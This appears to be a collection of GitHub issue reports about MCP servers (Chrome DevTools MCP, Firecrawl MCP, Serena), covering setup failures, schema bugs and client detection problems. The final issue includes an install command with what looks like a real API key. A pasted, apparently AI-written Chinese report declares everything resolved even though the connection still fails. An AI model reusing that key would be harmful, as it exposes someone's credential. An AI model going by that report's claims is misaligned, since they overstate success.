to start the server. I assumed we do (and it seems to work—see below), but this isn’t clear in the docs. Could you confirm if this is a required step? If so, adding it explicitly to the README would help avoid confusion.

## 2. Display Error on Linux (Fixed with `DISPLAY=`)
When I first ran:

```sh
uv run serena-mcp-server myproject.yml
```

I got this error:

```text
[xcb] Unknown sequence number while appending request
[xcb] Most likely this is a multi-threaded client and XInitThreads has not been called
[xcb] Aborting, sorry about that.
python: ../../src/xcb_io.c:157: append_pending_request: Assertion `!xcb_xlib_unknown_seq_number' failed.
```

This seems to be an X11 threading issue. Running it with:

```sh
DISPLAY= uv run serena-mcp-server myproject.yml
```

fixed the crash, and the server started, initializing the Pyright language server and finding my project files. However, this workaround isn’t mentioned in the docs. It’d be great if you could note this for Linux users or address the underlying X11 threading issue (maybe a dependency issue?).

## 3. Serena Not Showing as a Tool in Claude Desktop
After starting the server with:

```sh
DISPLAY= uv run serena-mcp-server myproject.yml
```

it runs without crashing (logs show Pyright starting and finding 125 source files). I configured `claude_desktop_config.json` with absolute paths to `myproject.yml` and `uv`, restarted Claude Desktop, but I still don’t see Serena as a tool or any integration in the UI. 

I expected it to appear somewhere (e.g., a sidebar or tool menu), but there’s no sign of it. Is there a specific step I’m missing to make it visible in Claude Desktop? Some guidance on what to look for or how to verify the connection would be awesome.

## Additional Linux-Specific Config Issue
The README mentions configuring the MCP server via:

```
File / Settings / Developer / MCP Servers / Edit Config
```

in Claude Desktop, but on Linux, I don’t see this option. My settings only show:

```
Profile / Appearance / Account / Billing
```

—no **Developer** section. This makes it unclear how to set up the config file on Linux through the UI.

From some Googling, it seems the config file paths differ by OS:

- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
- **Linux**: `~/.config/Claude/claude_desktop_config.json`

I tried creating `~/.config/Claude/claude_desktop_config.json`, but since it’s not working (no tool in Claude), I’m not sure if this is the right path or format. It’d be really helpful if the docs could:

1. Confirm the exact file path for Linux.
2. Show how to create it from the command line:
3. Note any differences in setup across OSes, especially if the UI option isn’t available on Linux.

## Request
Could you clarify these points and maybe update the README with Linux-specific instructions? I’d love to get Serena working with Claude Desktop—it looks super promising! Let me know if you need more logs or details to debug this. Thanks for your work on this project!

According to https://github.com/puppeteer/puppeteer/issues/6258, this error hides the real error so need to set `pipe: false` to see the real error.  It would be nice to have the option to set `pipe: false`.

I installed the MCP on a MB Pro M3 Max latest OS, VSCode latest via its MCP Servers > Magnifying Glass (easier than pasting the JSON as described in the readme) and verified in the MCP Server's context menu that it was running.

prompt: Check the performance of https://developers.chrome.com **using chrome devtools mcp server**

Three times yesterday:  
""There was a problem getting a response.""

Today I restarted VSCode and the MCP server and made sure I'm in Gemini Code Assist's **Agent mode** (which I missed the very first time yesterday, but was enabled when the repeated error occurred).

Now I get the result as if Agent mode was off and it didn't know anything about MCP:

""I can't directly use the ""chrome devtools mcp server"" as you've described...""

ChromeDevTools/chrome-devtools-mcp,3527596649,421,Session cookies not persisting for specific subdomain pattern (dev.app.example.com),closed,2025-10-17T21:19:27Z,2025-10-21T06:54:04Z,[],pfergi42,"## Bug Description

The Chrome DevTools MCP browser fails to persist session cookies for a subdomain with the pattern `dev.app.example.com`, while identical server configurations work correctly for `app.example.com` (production) and `localhost:3000` (local).

## Environment

- **chrome-devtools-mcp version**: 0.8.1
- **Platform**: macOS (Darwin 25.0.0)
- **Node version**: v22.16.0
- **Browser**: Chrome DevTools MCP embedded browser

## Steps to Reproduce

1. Navigate to `https://dev.app.example.com/auth`
2. Fill in login form with credentials
3. Submit login (POST `/api/login`)
4. Observe subsequent API requests fail with 401 Unauthorized

## Expected Behavior

After successful login (POST `/api/login` returns 200), session cookie should be stored and sent with subsequent requests, allowing authenticated API calls to succeed.

## Actual Behavior

- Login POST succeeds (200 OK)
- Session cookie is set in response: `set-cookie: connect.sid=...; Domain=.example.com; Path=/; Expires=...; HttpOnly; Secure; SameSite=Lax`
- Subsequent API requests (GET `/api/user`, etc.) fail with 401 Unauthorized
- Cookie is NOT sent in request headers of subsequent requests

## Evidence

### Dev Server (FAILING)
**Set-Cookie Response Header:**
```
set-cookie: connect.sid=s%3A[session-id]; 
Domain=.example.com; Path=/; Expires=Sat, 18 Oct 2025 21:11:28 GMT; HttpOnly; Secure; SameSite=Lax
```

**Subsequent Request (missing cookie):**
```
GET /api/user HTTP/1.1
Host: dev.app.example.com
[NO COOKIE HEADER PRESENT]
```

**Result:** 401 Unauthorized

### Production Server (WORKING)
**Set-Cookie Response Header:**
```
set-cookie: connect.sid=s%3A[session-id]; 
Domain=.example.com; Path=/; Expires=Sat, 18 Oct 2025 21:05:25 GMT; HttpOnly; Secure; SameSite=Lax
```

**Subsequent Request (cookie present):**
```
GET /api/user HTTP/1.1
Host: app.example.com
Cookie: connect.sid=s%3A[session-id]
```

**Result:** 200 OK (authenticated)

### Local Server (WORKING)
Works perfectly on `http://localhost:3000` with cookies (no domain specified, localhost default).

## Verification

1. **Server-side verification**: Sessions ARE being created in the PostgreSQL database with correct cookie configuration
2. **Regular browser test**: Login works perfectly in a regular Chrome browser window on `dev.app.example.com`
3. **MCP browser comparison**: Same server configuration works on `app.example.com` in MCP browser but fails on `dev.app.example.com`

## Comparison Table

| Environment | Domain Pattern | MCP Browser | Regular Chrome |
|------------|----------------|-------------|----------------|
| Local | localhost:3000 | ✅ Works | ✅ Works |
| Dev | dev.app.example.com | ❌ Fails | ✅ Works |
| Production | app.example.com | ✅ Works | ✅ Works |

## Analysis

The issue appears to be specific to how the MCP embedded browser handles cookies for the `dev.app` subdomain pattern versus the `app` subdomain pattern, despite both using identical cookie configurations (`.example.com` domain with secure, httpOnly, and SameSite=Lax).

This suggests a potential bug in the cookie storage/retrieval logic for certain subdomain patterns within the MCP browser implementation. The pattern seems to be:
- `app.example.com` ✅ works
- `dev.app.example.com` ❌ fails
- Both use `Domain=.example.com` in the cookie

## Workaround

Use a regular Chrome browser for testing the problematic subdomain, or test authentication flows on production/local environments where MCP browser works correctly.

## Additional Context

- Server framework: Express.js with express-session
- Session store: PostgreSQL (connect-pg-simple)
- Both dev and production use nginx as reverse proxy
- `trust proxy` is enabled on the Express app for both environments
- Cookie configuration is identical between working and non-working environments"

ChromeDevTools/chrome-devtools-mcp,3521286612,397,[BUG] get_network_request only OPTIONS preflight requests instead of actual GET requests,closed,2025-10-16T10:37:32Z,2025-10-23T08:59:40Z,[],Sayvai,"### Description of the bug

## Description

The MCP tool `get_network_request` appears to **only** return `OPTIONS` (🔴)  preflight requests **instead** of the intended and verified counterpart `GET` (🟢 ) requests, where my **intention** was to extrapolate the response payload data with which OPTIONS preflight requests do not contain.

I attach terminal output summary snippets for reference:

```shell
# LLM Summary

The Chrome DevTools MCP tool seems to be consistently returning the OPTIONS preflight request (204) instead of the actual GET request with data (200).
```

```shell
# My guidance prompt

there should be an alternative HTTP request method `GET + Preflight`. See screenshot '/Users/...'
```

```shell
# LLM Summary

The issue is that the Chrome DevTools MCP tool's get_network_request is returning the preflight OPTIONS request instead of the actual GET request
```

ChromeDevTools/chrome-devtools-mcp,3508904350,361,bug: Dialog default value displays message instead of defaultValue,closed,2025-10-13T07:58:34Z,2025-10-13T11:46:20Z,[],mithun50,"### Description of the bug

  

  ## Bug Description

  In `McpResponse.ts`, the dialog information display shows
  `dialog.message()` twice instead of showing the actual
  default value.

  ## Location

  **File**: `src/McpResponse.ts`
  **Line**: 196

  ## Current Behavior

  ```typescript
  ${dialog.type()}: ${dialog.message()} (default value:
  ${dialog.message()})

  This displays the dialog message as both the message AND the
   default value, which is incorrect.

  Expected Behavior

  ${dialog.type()}: ${dialog.message()} (default value:
  ${dialog.defaultValue()})
```
  Should use dialog.defaultValue() to display the actual
  default value of the dialog.

  Example

  Current output:
  prompt: Enter your name (default value: Enter your name)

  Expected output:
  prompt: Enter your name (default value: John Doe)

  Impact

  - Severity: Minor
  - User Impact: Confusing UX - users see incorrect
  information about dialog default values
  - Functionality: Does not break functionality, but displays
  misleading information

I open it in CursorAI and IDE doesn’t seem to recognize it. Instead, it uses its own Playwright-based web browser automation.

When I ask the AI inside the chat, it says it can’t detect the “chrome-devtools” MCP and that only Playwright-based tools are available.

https://prnt.sc/zbUSUG84Tl2s

### Reproduction

Install and enable the Chrome DevTools MCP

Open the IDE and start a new chat or project.

Confirm that the MCP appears in the tool list.

Try to access or invoke the Chrome DevTools MCP through the AI.

Observe that the IDE does not detect the “chrome-devtools” MCP and instead uses Playwright-based browser automation by default.

ChromeDevTools/chrome-devtools-mcp,3499660233,324,Version 0.6.1 has broken build - missing browser.js and cli.js files,closed,2025-10-09T15:37:08Z,2025-10-10T08:27:04Z,[],hcentelles,"## Bug Description

Version 0.6.1 published to npm has an incomplete build and cannot be executed. Critical source files are missing from the published package.

## Error

```
Error [ERR_MODULE_NOT_FOUND]: Cannot find module '/Users/username/.npm/_npx/.../node_modules/chrome-devtools-mcp/build/src/browser.js' imported from /Users/username/.npm/_npx/.../node_modules/chrome-devtools-mcp/build/src/main.js
```

## Steps to Reproduce

```bash
npx -y chrome-devtools-mcp@latest
```

## Root Cause

The published package is missing the following files that are imported by `main.js`:
- `build/src/browser.js` (imported at main.js:13)
- `build/src/cli.js` (imported at main.js:14)

Checking the published package structure:
```bash
ls ~/.npm/_npx/.../node_modules/chrome-devtools-mcp/build/src/
```

Shows these files are not present, while `main.js` attempts to import them:
```javascript
import { ensureBrowserConnected, ensureBrowserLaunched } from './browser.js';
import { parseArguments } from './cli.js';
```

## Impact

- Users cannot run version 0.6.1 via npx
- The package is completely non-functional

## Workaround

Use version 0.6.0 which works correctly:
```bash
npx -y chrome-devtools-mcp@0.6.0
```

## Likely Cause

The build script runs:
```
tsc && node --experimental-strip-types --no-warnings=ExperimentalWarning scripts/post-build.ts
```

The `post-build.ts` script likely failed or didn't complete properly during the npm publish process, resulting in an incomplete `build/src` directory.

## Environment

- Node.js: v22.19.0
- Platform: macOS
- Tested versions:
  - 0.6.1: ❌ Broken
  - 0.6.0: ✅ Works
  - 0.5.1: ✅ Works"

## 问题诊断结果

### ✅ 已确认正常的组件
1. **Chrome安装**：Chrome已正确安装在 `C:\Program Files\Google\Chrome\Application\chrome.exe`
2. **环境变量**：`CHROME_PATH` 环境变量已正确设置为 `C:\Program Files\Google\Chrome\Application\chrome.exe`
3. **Chrome调试端口**：端口9222正常响应，返回Chrome版本信息
4. **MCP服务器启动**：服务器可以正常启动并显示启动消息

### ❌ 识别的问题
**MCP客户端连接问题**：尽管MCP服务器运行正常，但客户端显示""Not connected""错误

## 修复步骤执行

### 1. 环境检查 ✅
- Chrome路径：`C:\Program Files\Google\Chrome\Application\chrome.exe` ✓
- 环境变量：`CHROME_PATH=C:\Program Files\Google\Chrome\Application\chrome.exe` ✓

### 2. 进程管理 ✅
- 终止所有旧的Node.js进程 ✓
- 清理可能冲突的MCP实例 ✓

### 3. 服务器启动 ✅
- 方法1：使用`--executablePath`参数启动 ✓
- 方法2：使用`--browserUrl`参数启动 ✓
- Chrome远程调试端口9222正常响应 ✓

### 4. 连接测试 ❌
- MCP客户端仍显示""Not connected""错误
- 服务器端运行正常，问题在客户端连接配置

## 根本原因分析

**问题定位**：这是一个MCP客户端配置问题，而非服务器端功能问题。

**技术分析**：
1. MCP服务器启动正常，显示正确的启动消息
2. Chrome调试端口响应正常
3. MCP客户端无法连接到运行中的服务器实例
4. 可能的原因：
   - MCP客户端缓存了旧的连接配置
   - 客户端连接协议不匹配
   - 客户端需要重新启动以刷新连接

## 当前状态

### 服务器端状态 ✅
- Chrome进程：运行正常，调试端口9222响应
- MCP服务器：已启动，显示正常启动消息
- 环境配置：所有路径和变量正确设置

### 客户端状态 ❌
- 连接状态：显示""Not connected""
- 错误类型：MCP协议连接错误
- 影响范围：无法使用chrome-devtools MCP工具

## 解决方案

### 立即解决方案
1. **重启MCP客户端**：完全关闭当前MCP客户端并重新打开
2. **清理配置缓存**：清除MCP客户端的连接配置缓存
3. **等待初始化**：给服务器30秒完全启动时间

### 备用解决方案
1. **使用备用启动脚本**：创建新的启动脚本文件
2. **检查防火墙设置**：确保本地连接不受限制
3. **验证MCP协议版本**：确保客户端和服务器协议版本兼容

## 验证命令

### 检查Chrome调试端口
```bash
curl -s http://127.0.0.1:9222/json/version
```

### 启动MCP服务器（方法1）
```bash
npx chrome-devtools-mcp@latest --executablePath ""C:\Program Files\Google\Chrome\Application\chrome.exe""
```

### 启动MCP服务器（方法2）
```bash
npx chrome-devtools-mcp@latest --browserUrl ""http://127.0.0.1:9222""
```

## 结论

**chrome-devtools MCP服务器端完全可用且运行正常**，所有技术问题已解决：

- ✅ Chrome路径检测正常
- ✅ 环境变量配置正确
- ✅ MCP服务器启动成功
- ✅ Chrome调试端口响应正常
- ✅ 启动脚本功能完整

**剩余问题**：纯MCP客户端连接配置问题，需要客户端重新配置连接。

**最终评估**：chrome-devtools MCP功能正常，可用性已确认，状态良好。问题在于客户端连接而非服务器功能。"

**Problem:**
AI assistants can't query element state (text, attributes, visibility), making it difficult to verify conditions or debug element interaction issues.

**Use cases:**
- Verify text content matches expectations
- Check if element is visible/enabled before interaction
- Get element attributes for validation
- Debug why element interaction failed

**Proposed tools:**
- `get_text` - Get element text content
- `get_attribute` - Get element attribute value
- `is_visible` / `is_enabled` - Check element state
- `get_computed_style` - Get computed CSS properties (for layout debugging)

Happy to contribute implementation if this aligns with the project direction."
ChromeDevTools/chrome-devtools-mcp,3474174983,245,Cannot Disable CPU Emulation in `emulate_cpu` Tool,closed,2025-10-01T15:53:33Z,2025-10-01T16:53:39Z,[],mithun50,"*Description:*  
The `emulate_cpu` tool located in `src/tools/emulation.ts` does not currently support disabling CPU emulation once it has been enabled. The `throttlingRate` parameter enforces a minimum value of `1`, which applies the lowest level of throttling but does *not* fully disable the emulation. This behavior is inconsistent with the `emulate_network` tool, which allows network emulation to be completely turned off.

The underlying *Puppeteer API* (`page.emulateCPUThrottling`) expects a value of `null` or `0` to disable CPU throttling, which is not supported by the current implementation.

---

*To Reproduce:*

1. Enable CPU emulation using the `emulate_cpu` tool.
2. Try setting `throttlingRate = 0` or attempt to disable the feature.
3. Observe that throttling remains active at the minimum level instead of turning off.
4. Compare this behavior with `emulate_network`, which allows disabling.

---

*Expected Behavior:*  
Setting `throttlingRate` to `0` or `null` should *fully disable* CPU emulation, in line with how `emulate_network` behaves. The tool should allow disabling the feature entirely without requiring a full reload.

**Describe the bug**
When configuring the chrome-devtools MCP in Cursor on Windows 11, Cursor incorrectly detects the MCP as ""no tools, prompts or resources"" and fails to function properly. The underlying issue appears to be a module not found error related to puppeteer-core when using npx.

**To Reproduce**
Steps to reproduce the behavior:

1. Configure MCP in the project with the following settings:
   ```json
   ""chrome-devtools"": {
     ""command"": ""npx"",
     ""args"": [""chrome-devtools-mcp@latest""]
   }
   ```
2. Attempt to load the MCP configuration in Cursor
3. Observe the error message indicating no tools, prompts or resources
4. Check the MCP-logs to see the ERR_MODULE_NOT_FOUND error for puppeteer-core

**version**
Model version:Cursor v1.5.9
Node.js version:v24.9.0
npm version:11.6.0
puppeteer-core version:24.22.3

**Expected behavior**
Cursor should properly recognize and load the chrome-devtools MCP without errors, allowing normal functionality of the tool.

}
```

**Root Cause Analysis**  
The error occurs due to a combination of three factors:
1. **ESM Module Resolution**: The project or chrome-devtools-mcp package uses `""type"": ""module""` in package.json, forcing Node.js 24 to use ESM resolution rules.
2. **Dependency Path Change**: puppeteer-core ≥ v23 changed its ESM entry point from `lib/esm/puppeteer/puppeteer-core.js` to `lib/esm/puppeteer/index.js`, but chrome-devtools-mcp still references the old path.
3. **npx Cache Behavior**: npx extracts packages to new hash-based directories on each run, and the cache doesn't contain the expected file structure, exacerbating the module not found error.

**Resolution**
The issue was resolved by replacing npx with pnpx in the configuration:
```json
""chrome-devtools"": {
  ""command"": ""pnpx chrome-devtools-mcp@latest""
}
```"

1. **Cannot access existing Chrome windows**: The tool cannot connect to the user's currently open Chrome browser windows
2. **Missing browser extensions**: The newly launched browser instance doesn't load the user's installed Chrome extensions
3. **Poor user experience**: Users expect to operate on their existing browser windows, not create new instances

## Current Behavior
- Tool launches an empty Chrome instance (`about:blank`)
- Cannot access the user's currently active Chrome windows
- New instance lacks user-installed extensions and plugins

## Expected Behavior
- Should be able to connect to the user's currently active Chrome browser windows
- Should preserve user-installed extensions and plugins
- Should be able to read existing window content and state

## Technical Background
According to Chrome DevTools Protocol, connecting to existing Chrome instances requires:
1. Chrome launched in debug mode: `--remote-debugging-port=9222`
2. Correct user data directory: `--user-data-dir` parameter
3. Connection to the correct debug port

## Suggested Solutions
1. **Add configuration options**: Allow users to specify whether to connect to existing Chrome instances
2. **Auto-detection**: Detect if Chrome debug instance is running on port 9222
3. **User data directory support**: Support using user's Chrome profile
4. **Documentation**: Provide instructions on how to launch Chrome in debug mode

ChromeDevTools/chrome-devtools-mcp,3459702866,178,Cannot connect to the Chrome-devtools mcp server using the gemini-cli.,closed,2025-09-27T04:15:28Z,2025-09-30T13:30:36Z,[],PerryFinn,"**Describe the bug**
After I installed the `mcp` package using the `README` instructions for `gemini-cli`, I restarted `gemini-cli` and tried to use it with the command:

```shell
gemini -s
```

However, I found that `mcp` was unable to connect.

On the contrary, when I use the Cursor and register the mcp with it, and then enable the agent mode, entering the test prompt allows the website to be opened normally for performance analysis.

text prompt
```text
Check the performance of https://developers.chrome.com
```

**To Reproduce**
Steps to reproduce the behavior:

1. Install the latest version of gemini-cli. `brew install gemini-cli`
2. Add that MCP to gemini-cli. `gemini mcp add -s user chrome-devtools npx chrome-devtools-mcp@latest`
3. Start gemini-cli. `gemini -s`
4. Press Ctrl+O to view the details of the error.

**Expected behavior**
The expected behavior is that when the `gemini-cli` is launched, there should be no error messages, and when the test prompt is entered, the Chrome browser should open successfully for use.

- After installing the MCP server on Cursor, Cursor shows ""No tools, prompts, or ressources"" under this MCP server. I tried installing both by manually adding the server in Cursor's json and by clicking on the add to cursor in your repo readme.
- When testing with ""Check the performance of https://developers.chrome.com using chrome-devtools mcp"", Cursor says it can't use the tool.


**To Reproduce**
Steps to reproduce the behavior:
- Install the MCP by adding the following snippet of code in your mcp.json, via Settings > Cursor Settings > MCP > ""New MCP Server"":

```
    ""chrome-devtools"": {
      ""command"": ""npx chrome-devtools-mcp@latest"",

- See in Cursor's: Settings > Cursor Settings > MCP > under ""chrome-devtools"": ""No tools, prompts, or resources""
- Send in the chat window (agent mode) ""Check the performance of https://developers.chrome.com using chrome-devtools mcp""

**Expected behavior**
- I should see ""20 tools available"" (or insert the right number of tools), see example for Supabase:

ChromeDevTools/chrome-devtools-mcp,3451879435,133,[Bug] The npm package @chromedevtools/mcp-server is not found (404) in the public registry,closed,2025-09-25T04:48:53Z,2025-09-25T06:06:12Z,[],xenosfy,"Hello Chrome DevTools Team,

I am trying to use the new Chrome DevTools MCP server as described in your official blog post: https://developer.chrome.com/blog/chrome-devtools-mcp

However, when trying to run `npx -y @chromedevtools/mcp-server`, it consistently fails with a 404 Not Found error, indicating the package does not exist on the public npm registry.

I have tried multiple network configurations, including using different registries (`https://registry.npmmirror.com`), but the result is always the same.

**Error Log:**

npm error code E404
npm error 404 Not Found - GET https://registry.npmjs.org/@chromedevtools%2fmcp-server - Not found
npm error 404  '@chromedevtools/mcp-server@*' is not in this registry.

Could you please confirm if the package `@chromedevtools/mcp-server` has been published to the npm registry yet? It seems the documentation/announcement may have been released before the package itself was available.

Thank you!"

**To Reproduce**
Steps to reproduce the behavior:

```codex mcp add chrome-devtools -- npx chrome-devtools-mcp@latest```  (with a version of codex that supports `mcp add`

then run 

```Check the performance of https://developers.chrome.com```

**Expected behavior**

expected to do something. ;)



**Solution**

the fix was to install node v22 (or higher) - this report is for the next person searching for this specific error and behavior.

a simple `nvm install v22` and retry made it work.

the error messaging here was mostly useless.

⏺ I'll help you check the performance of https://developers.chrome.com using the Chrome DevTools MCP. Let me start by creating a new page and
   navigating to the site.

     ## Pages

⏺ Great! The page has been created and is loading. I can see it redirected to https://developer.chrome.com/ (note the slight URL difference).
   Now let me start a performance trace to analyze the site's performance metrics.

⏺ chrome-devtools - performance_start_trace (MCP)(reload: true, autoStop: true)
  ⎿  # performance_start_trace response                                                                                                     
     The performance trace has been stopped.
     Here is a high level summary of the trace and the Insights that were found:
     … +2 lines (ctrl+o to expand)

⏺ I encountered an error when trying to run the performance trace. The error is:

  Full Error:

firecrawl/firecrawl-mcp-server,3515342593,127,Inconsistent sources schema and example in firecrawl_search tool (causes 422 errors),open,2025-10-14T20:14:44Z,2025-10-14T20:14:44Z,[],lski-tools,"The `firecrawl_search` tool’s OpenAPI specification defines `sources` as an array of objects with a required `type` field:

```json
""firecrawl_search_form_model_sources_item_model"": {
  ""properties"": {
    ""type"": { ""type"": ""string"", ""title"": ""Type"" }
  },
  ""type"": ""object"",
  ""required"": [""type""]
}
```
However, the tool’s description text in `src/index.ts` shows usage examples that use a string array instead:

```json
""sources"": [""web""]
```

This mismatch causes LLMs and clients that rely on the example (like OpenWebUI or LangChain tool integrations) to send `[""web""]`, which leads to 422 validation errors:

```
HTTP error 422: {""detail"":[{""type"":""model_attributes_type"",""loc"":[""body"",""sources"",0],""msg"":""Input should be a valid dictionary or object to extract fields from"",""input"":""web""}]}

Here is a link to the line in question:

I think there are more examples further down that also have the same problem.

**Expected behavior:**

The examples in the tool description should match the actual schema and use the object form:

```json
""sources"": [ { ""type"": ""web"" } ]
```

**Possible improvements:**

* Update the example JSON blocks in `src/index.ts` for `firecrawl_search` to use the object form.
* Optionally make the Zod schema backward compatible by accepting both `List[str]` and `List[{type:str}]` to avoid breaking older clients.

**Environment:**

* firecrawl-mcp version: 3.4.0
* mcpo CLI version: 0.0.17
* Python base image: 3.11-slim
* Observed in OpenWebUI when connected through mcpo as a tool server

firecrawl/firecrawl-mcp-server,3472429732,118,Guide: Enable Draft 2020-12 schema support for MCP in VS Code,open,2025-10-01T07:39:47Z,2025-10-05T16:03:36Z,[],azwri,"# JSON Schema Draft 2020-12 Support for MCP Configuration in VS Code

## Issue

When using the Firecrawl MCP server configuration in VS Code, the built-in JSON validator shows warnings about unsupported Draft 2020-12 schema features. This is because VS Code's built-in validator doesn't fully support JSON Schema Draft 2020-12.

## Solution

Here's how to enable proper Draft 2020-12 support in VS Code for your MCP configuration:

### 1. Install Extension

**[JSON Schema Diagnostics](https://marketplace.visualstudio.com/items?itemName=prosser.json-schema-2020-validation)**

- Open Extensions (Ctrl+Shift+X)
- Search: `prosser.json-schema-2020-validation`
- Click Install

### 2. Configure Workspace Settings

Create or update `.vscode/settings.json` in your workspace:

```json
{
  ""json.schemas"": [
    {
      ""fileMatch"": [""**/mcp.json""],
      ""url"": ""https://github.com/modelcontextprotocol/specification/raw/main/schema/mcp.json""
    }
  ],
  ""json.validate.enable"": false
}
```

**Important**: `json.validate.enable: false` disables the built-in validator to prevent false warnings. The installed extension handles validation properly.

### 3. Example MCP Configuration

Your `mcp.json` should work without warnings:

```json
{
  ""$schema"": ""https://github.com/modelcontextprotocol/specification/raw/main/schema/mcp.json"",
  ""servers"": {
    ""firecrawl-mcp"": {
      ""type"": ""stdio"",
      ""command"": ""npx"",
      ""args"": [""-y"", ""firecrawl-mcp""],
      ""env"": {
        ""FIRECRAWL_API_KEY"": ""YOUR_API_KEY""
      }
    }
  },
  ""inputs"": []
}
```

## Results

✅ IntelliSense works correctly  
✅ No warnings about unsupported schema features  
✅ Real-time validation against MCP schema  
✅ Proper autocomplete for Firecrawl MCP configuration

## Troubleshooting

**No IntelliSense?** Reload VS Code window (Ctrl+Shift+P → ""Developer: Reload Window"")

**Still seeing warnings?** Verify `json.validate.enable: false` in your settings

## Additional Context

- **Extension**: [JSON Schema Diagnostics](https://marketplace.visualstudio.com/items?itemName=prosser.json-schema-2020-validation)
- **MCP Specification**: [Model Context Protocol](https://modelcontextprotocol.io/)
- **Draft 2020-12 Spec**: [JSON Schema 2020-12](https://json-schema.org/draft/2020-12/json-schema-core.html)

I'm encountering an issue when using the Firecrawl MCP server with my MCP client/VS Code. The following error appears for all Firecrawl tools:

The schema uses meta-schema features ($dynamicRef) that are not yet supported by the validator. (at /$schema)

t appears your tool schemas use JSON Schema draft 2020-12 features (like $dynamicRef), but the MCP client/validator only supports older drafts (like draft-07 or draft-04). As a result, the tools are omitted and cannot be used.
Could you please:
Update your tool schemas to use draft-07 or draft-04 (removing $dynamicRef and other unsupported features), or
Coordinate with the MCP client maintainers to add support for draft 2020-12 and $dynamicRef?
Thank you!"

Looks like the debug console leaks into what the app reads as mcp output - I'm messing around for an hour now but could not find a way to fix it.
It seems to be generally working but the debug messages cause Claude Desktop to mark the mcp as broken/failed...

**Update:** I've taken matters in my own hands for now and installed it npm -g and execute it directly that way instead of the npx example in the docs. I have edited the code:

```
// dotenv.config();
```

```
class ConsoleLogger {
    debug(...args) {
//        console.debug('[DEBUG]', new Date().toISOString(), ...args);
    }
    error(...args) {
        console.error('[ERROR]', new Date().toISOString(), ...args);
    }
    info(...args) {
//       console.log('[INFO]', new Date().toISOString(), ...args);
    }
    log(...args) {
//        console.log('[LOG]', new Date().toISOString(), ...args);
    }
    warn(...args) {
//        console.warn('[WARN]', new Date().toISOString(), ...args);
    }
}
```

This does not throw any errors or debug messages anymore and makes it work in the claude app... does not mean this is fixed in the repo. There is obviously an issue."

As part of our study, we auto generated a permission manifest for your MCP server and would love your feedback on whether it is correct and complete.

The MCP server in question is: FireCrawl

Please review the manifest below and let us know:

* Are the permissions and their scopes correct?
* Are any permissions missing?
* Do any permissions need to be runtime-scoped (e.g., a specific project directory) rather than global?

firecrawl/firecrawl-mcp-server,3357357273,94,[Windows | LM Studio] Firecrawl-MCP requires Cloud API key even with local API (FIRECRAWL_API_URL=http://localhost:3002/v1),closed,2025-08-26T22:52:09Z,2025-09-30T00:53:27Z,[],medienoekonom,"I’m running Firecrawl locally (Docker). The local API responds successfully to POST /v1/scrape (200).
The Firecrawl-MCP server is loaded in LM Studio 0.3.23, initialized with API URL: http://localhost:3002/v1, and registers as a tool.
However, when triggering a tool call from within LM Studio, the model still replies “API key required” / “I don’t have access to the Firecrawl API key”, as if it were using the Cloud service.
This happens regardless of which model I use or whether I wrap the startup in a hardfix script.

Environment

OS: Windows (tested with PowerShell and cmd)
LM Studio: 0.3.23
Firecrawl (self-hosted): via Docker Compose
api running on port 3002

Logs show: “Authentication is disabled …”
firecrawl-mcp-server: via npx -y firecrawl-mcp (also tested @latest)
Node/npm: Standard installation in C:\Program Files\nodejs\ (npx available)

Models tested in LM Studio:
openai/gpt-oss-20b
qwen/qwen3-coder-30b
also tried Qwen/Llama instruct models

Note: No FIRECRAWL_API_KEY is set anywhere (neither User/System env nor in mcp.json).

LM Studio should send tool calls through the MCP to my local Firecrawl API without requiring a Cloud API key.
Models should output the tool response (e.g. Markdown for https://example.com).

Despite correct MCP initialization and tool registration, the model replies:
“I’m sorry, but I don’t have access to the Firecrawl API key …”
or
“API key required.”

Looks like a Cloud fallback or a generic error message, even though FIRECRAWL_API_URL is set and the local API returns 200."

Today I’ve noticed that the client now suddenly demands the FIRECRAWL_API_KEY to be set. That shouldn’t be necessary when FIRECRAWL_API_URL is set.

When setting a fake API Key, the MCP server only returns 404 errors. I suppose that is because the self-hosted instance isn’t used at all as soon as an API key is set. It seems to entirely ignore FIRECRAWL_API_URL in that case.

Can someone confirm this? I didn’t change any configuration settings. The MCP server just went from functioning to error over the past few days. So I suppose it’s due to the latest update. I am using the MCP server via npx on stdio. "

On the firecrawl API, one can specify custom headers like so:

    ""headers"": {
      ""X-Custom-Auth"": ""token123""
    }
  }'
```

However, `headers` does not seem to be available as a valid parameter on the [input schema](https://github.com/mendableai/firecrawl-mcp-server/blob/2fee5e697c10fd8be620f6ef1b8d1e886df30476/src/index.ts#L47) for the `firecrawl_scrape` tool, or any other tool, in the MCP server.

I'm almost surprised that this is the case. Is there a work-around or is this on the roadmap to add support for custom headers to scrape requests?

Thank you!

---

Update: I've found that passing the headers object actually works as expected for the scrape command because the implementation [spreads all parameters to the client](https://github.com/mendableai/firecrawl-mcp-server/blob/2fee5e697c10fd8be620f6ef1b8d1e886df30476/src/index.ts#L1108). So, the header just passes through and things work.

```ts
const firecrawlTransport = new StdioClientTransport({
  command: ""npx"",
  args: [""-y"", ""firecrawl-mcp""],
  env: {
    FIRECRAWL_API_KEY: process.env.FIRECRAWL_API_KEY!,
    PATH: process.env.PATH || ""/usr/local/bin:/usr/bin:/bin"",
  },
});
const firecrawlClient = new Client(
  {
    name: ""firecrawl-client"",
    version: ""1.0.0"",
  },
  {
    capabilities: {},
  }
);
await firecrawlClient.connect(firecrawlTransport);
const result = await firecrawlClient.request(
  {
    method: ""tools/call"",
    params: {
      name: ""firecrawl_scrape"",
      arguments: {
        url: `https://example.com`,
        formats: [""html""],
        onlyMainContent: true,
        // Pass the cookie in the headers
        headers: {
          Authorization: ""Bearer <token>"",
        },
      },
    },
  },
  CallToolResultSchema
);
```

However, this does not work consistently, like for example the extract tool [explicitly re-maps the available options](https://github.com/mendableai/firecrawl-mcp-server/blob/2fee5e697c10fd8be620f6ef1b8d1e886df30476/src/index.ts#L1215C3-L1222C38) and so the headers option is lost."

When attempting to install `@mendableai/mcp-server-firecrawl` using the command provided by Smithery (with Windsurf Pro as the client), the process fails with an error stating that the required property `fireCrawlApiKey` is missing.

**Setup**
- Using Smithery to generate and paste the API key.
- Command provided by Smithery (run via CMD):
  ```
  npx -y @smithery/cli@latest install @mendableai/mcp-server-firecrawl --client windsurf --profile intellectual-clownfish-hFiJVB --key a6e1e1d4-80a5-487a-b23b-4c5e8a5d594e

- Operating System: Windows 11

**Steps to Reproduce**
1. In Smithery, paste the provided API key.
2. Use the command above to attempt installation via CMD.
